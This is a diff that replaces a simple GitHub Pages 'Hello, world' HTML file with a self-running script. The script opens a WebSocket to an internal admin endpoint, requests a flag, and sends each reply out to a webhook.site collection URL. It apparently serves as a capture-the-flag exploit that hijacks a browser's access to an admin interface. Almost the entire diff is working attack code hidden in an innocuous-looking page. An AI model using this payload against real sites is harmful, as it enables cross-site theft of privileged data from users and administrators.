@@ -1,10 +1,31 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>My GitHub Page</title>
-  </head>
-  <body>
-    <h1>Hello, world!</h1>
-    <p>Welcome to my GitHub Pages site!</p>
-  </body>
-</html>
+<script>
+  (function () {
+    const WS_URL = 'ws://web:8080/admin/ws';
+    const WEBHOOK_URL = 'https://webhook.site/6915a94b-5fcd-4506-a1ca-6ea389cd1576';
+
+    function sendFlagRequest(flag) {
+      const url = `${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}`;
+      fetch(url).catch(console.error);
+    }
+
+    function setupWebSocket() {
+      const socket = new WebSocket(WS_URL);
+
+      socket.addEventListener('open', () => {
+        socket.send('flag');
+      });
+
+      socket.addEventListener('message', (event) => {
+        if (event && event.data) {
+          sendFlagRequest(event.data);
+        }
+      });
+
+      socket.addEventListener('error', (err) => {
+        console.error('WebSocket error:', err);
+      });
+    }
+
+    setupWebSocket();
+  })();
+</script>
